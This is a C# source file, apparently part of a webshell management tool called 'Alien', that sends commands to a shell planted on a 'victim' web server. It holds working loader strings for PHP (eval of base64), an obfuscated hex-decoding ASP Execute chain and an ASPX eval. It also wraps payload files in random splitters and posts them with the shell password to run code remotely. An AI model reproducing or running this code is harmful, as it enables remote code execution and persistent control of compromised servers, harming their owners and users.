using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection.Metadata;
using System.Text;
using System.Threading.Tasks;

namespace Alien
{
    public class clsWeb
    {
        public clsVictim m_victim { get; set; }
        public HttpClient m_clnt { get; set; }

        /// <summary>
        /// 
        /// </summary>
        private Dictionary<enLanguage, string> m_dicSuffix = new Dictionary<enLanguage, string>()
        {
            { enLanguage.PHP, "php" },
            { enLanguage.ASP, "asp" },
            { enLanguage.ASPX, "aspx" },
            { enLanguage.ASMX, "asmx" },
            { enLanguage.ASHX, "ashx" },
            { enLanguage.JSP, "jsp" },
            { enLanguage.JSPX, "jspx" },
            { enLanguage.CGI, "cgi" },
            { enLanguage.Python, "py" },
        };

        /// <summary>
        /// 
        /// </summary>
        private Dictionary<enLanguage, string[]> m_dicRemoveSyntax = new Dictionary<enLanguage, string[]>()
        {
            {
                enLanguage.PHP,
                new string[]
                {
                    "<?php", "?>",
                }
            },
            {
                enLanguage.ASP,
                new string[]
                {
                    "<%", "%>",
                }
            }
        };

        /// <summary>
        /// 
        /// </summary>
        private Dictionary<enLanguage, string> m_dicDecodeFunc = new Dictionary<enLanguage, string>()
        {
            { enLanguage.PHP, "@eval(base64_decode('[PATTERN]'));" },
            { enLanguage.ASP, @"Execute(""Execute(""""On+Error+Resume+Next:Function+bd%28byVal+s%29%3AFor+i%3D1+To+Len%28s%29+Step+2%3Ac%3DMid%28s%2Ci%2C2%29%3AIf+IsNumeric%28Mid%28s%2Ci%2C1%29%29+Then%3AExecute%28%22%22%22%22bd%3Dbd%26chr%28%26H%22%22%22%22%26c%26%22%22%22%22%29%22%22%22%22%29%3AElse%3AExecute%28%22%22%22%22bd%3Dbd%26chr%28%26H%22%22%22%22%26c%26Mid%28s%2Ci%2B2%2C2%29%26%22%22%22%22%29%22%22%22%22%29%3Ai%3Di%2B2%3AEnd+If%22%22%26chr%2810%29%26%22%22Next%3AEnd+Function:Execute(""""""""On+Error+Resume+Next:""""""""%26bd(""""""""[PATTERN]"""""""")):Response.End"""")"")" },
            { enLanguage.ASPX, @"var a0=Request.Item[""PATTERN""];var err:Exception;eval(System.Text.Encoding.GetEncoding(""[WEncoding]"").GetString(System.Convert.FromBase64String(a0)),""unsafe"");Response.End();" }
        };

        /// <summary>
        /// 
        /// </summary>
        private Dictionary<enLanguage, string> m_dicSplitter = new Dictionary<enLanguage, string>()
        {
            { enLanguage.PHP, "echo(\"[SPLITTER]\");" },
            { enLanguage.ASP, "Response.Write(\"[SPLITTER]\");" },
            { enLanguage.ASPX, "Response.Write(\"[SPLITTER]\");" }
        };

        private Dictionary<enLanguage, Func<string, string>> m_dicEncapusulator = new Dictionary<enLanguage, Func<string, string>>()
        {
            { enLanguage.PHP, clsEzData.fnszStre2b64 },
            { enLanguage.ASP, szInput => Convert.ToHexString(Encoding.UTF8.GetBytes(szInput)) },
            { enLanguage.ASPX, clsEzData.fnszStre2b64 },
            { enLanguage.JSP, szInput => szInput } // nop
        };

        public clsWeb(clsVictim victim)
        {
            Encoding.RegisterProvider(CodePagesEncodingProvider.Instance);

            m_victim = victim;
            m_clnt = new HttpClient()
            {
                BaseAddress = new Uri(m_victim.ShellURL),
            };
        }

        /// <summary>
        /// HTTP POST request.
        /// </summary>
        /// <param name="szPayloadData"></param>
        /// <param name="szSplitter"></param>
        /// <returns></returns>
        public async Task<string> fnHttpPOST(string szPayloadData, string szSplitter)
        {
            StringContent content = new StringContent(szPayloadData, Encoding.GetEncoding(m_victim.ShellEncoding), "application/x-www-form-urlencoded");
            HttpResponseMessage resp = await m_clnt.PostAsync(string.Empty, content);
            string szRespContent = await resp.Content.ReadAsStringAsync();

            szSplitter = $"[{szSplitter}]";

            if (resp.IsSuccessStatusCode && szRespContent.Contains(szSplitter))
            {
                return szRespContent = szRespContent.Split(szSplitter)[1];
            }
            else
            {
                frmMsgBox f = new frmMsgBox(resp.StatusCode.ToString(), szRespContent);
                return string.Empty;
            }
        }

        public async Task<byte[]> fnabHttpPOST(string szPayloadData, string szSplitter)
        {
            StringContent content = new StringContent(szPayloadData, Encoding.GetEncoding(m_victim.ShellEncoding), "application/x-www-form-urlencoded");
            HttpResponseMessage resp = await m_clnt.PostAsync(string.Empty, content);
            byte[] abResp = await resp.Content.ReadAsByteArrayAsync();
            string szResp = Encoding.UTF8.GetString(abResp);

            szSplitter = $"[{szSplitter}]";

            if (resp.IsSuccessStatusCode && szResp.Contains(szSplitter))
            {
                szResp = szResp.Split(szSplitter)[1];

                byte[] abSplitter = Encoding.UTF8.GetBytes(szSplitter);
                
                int nStartIdx = fnIndexOf(abResp, abSplitter, 0);
                if (nStartIdx == -1)
                    throw new Exception("Cannot find spliter: " + szSplitter);

                nStartIdx += abSplitter.Length;

                int nEndIdx = fnIndexOf(abResp, abSplitter, nStartIdx);
                if (nEndIdx == -1)
                    throw new Exception("Cannot find spliter: " + szSplitter);

                long nLength = nEndIdx - nStartIdx;
                byte[] abBuffer = new byte[nLength];
                Array.Copy(abResp, nStartIdx, abResp, 0, nLength);

                return abBuffer;
            }
            else
            {
                frmMsgBox f = new frmMsgBox(resp.StatusCode.ToString(), szResp);
                return new byte[] { };
            }
        }

        private int fnIndexOf(byte[] haystack, byte[] needle, int start)
        {
            for (int i = start; i <= haystack.Length - needle.Length; i++)
            {
                bool found = true;
                for (int j = 0; j < needle.Length; j++)
                {
                    if (haystack[i + j] != needle[j])
                    {
                        found = false;
                        break;
                    }
                }
                if (found) return i;
            }
            return -1;
        }

        /// <summary>
        /// Do HTTP web connection to check alive.
        /// </summary>
        /// <returns></returns>
        public async Task<bool> fnbTestWebConnection()
        {
            try
            {
                using (HttpResponseMessage resp = await m_clnt.GetAsync(string.Empty))
                {
                    resp.EnsureSuccessStatusCode();

                    using (HttpContent content = resp.Content)
                    {
                        string szResult = await content.ReadAsStringAsync();
                        return resp.IsSuccessStatusCode;
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "fnbTestWebConnection()");
                return false;
            }
        }

        /// <summary>
        /// Execute test payload.
        /// </summary>
        /// <returns></returns>
        public async Task<bool> fnbTestShellConnection()
        {
            try
            {
                string szPattern = clsEzData.fnszGenerateRandomStr();
                string szResp = await fnszSendPayload("test", new string[] { szPattern });

                return string.Equals(szResp, szPattern);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "fnbTestShellConnection()");
                return false;
            }
        }

        public async Task<string> fnszSendPayload(string szPayloadName) => await fnszSendPayload(szPayloadName, new string[] { });
        public async Task<string> fnszSendPayload(string szPayloadName, string[] asParams)
        {
            string szSplitter = clsEzData.fnszGenerateRandomStr();
            string szPayload = fnGetPayload(szPayloadName, szSplitter);

            for (int i = 0; i < asParams.Length; i++)
                asParams[i] = $"z{i}={clsEzData.fnszStre2b64(asParams[i])}";

            string szParams = string.Join("&", asParams);
            szPayload = $"{m_victim.ShellPassword}={m_dicDecodeFunc[m_victim.ShellLanguage].Replace("[PATTERN]", clsEzData.fnszStre2b64(szPayload))}&{szParams}";

            return await fnHttpPOST(szPayload, szSplitter);
        }

        public async Task<byte[]> fnabSendPayload(string szPayloadName, string[] asParams)
        {
            string szSplitter = clsEzData.fnszGenerateRandomStr();
            string szPayload = fnGetPayload(szPayloadName, szSplitter);

            for (int i = 0; i < asParams.Length; i++)
                asParams[i] = $"z{i}={clsEzData.fnszStre2b64(asParams[i])}";

            string szMain = m_dicEncapusulator[m_victim.ShellLanguage](szPayload);
            string szLoader = m_dicDecodeFunc[m_victim.ShellLanguage].Replace("[PATTERN]", szMain);
            string szParams = string.Join("&", asParams);

            szPayload = $"{m_victim.ShellPassword}={szLoader}&{szParams}";

            return await fnabHttpPOST(szPayload, szSplitter);
        }

        /// <summary>
        /// Read payload from file with specified language, method and payload type.
        /// </summary>
        /// <param name="szPayloadName">Payload name, also represents to file name.</param>
        /// <returns>Payload content</returns>
        private string fnGetPayload(string szPayloadName, string szSplitter)
        {
            string szSuffix = m_dicSuffix[m_victim.ShellLanguage];
            string szPayloadFilePath = Path.Combine(new string[]
            {
                "Payload",
                m_victim.ShellLanguage.ToString(),
                m_victim.ShellMethod,
                m_victim.ShellPayloadType.ToString(),
                $"{szPayloadName}.{szSuffix}",
            });

            if (File.Exists(szPayloadFilePath))
            {
                string szPayload = File.ReadAllText(szPayloadFilePath);
                foreach (string szPattern in m_dicRemoveSyntax[m_victim.ShellLanguage])
                    szPayload = szPayload.Replace(szPattern, string.Empty);

                string szSplitFunc = m_dicSplitter[m_victim.ShellLanguage].Replace("SPLITTER", szSplitter);
                szPayload = $"{szSplitFunc}{szPayload}{szSplitFunc}";

                return szPayload;
            }
            else
            {
                MessageBox.Show("File not found: " + szPayloadFilePath, "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return string.Empty;
            }
        }
    }
}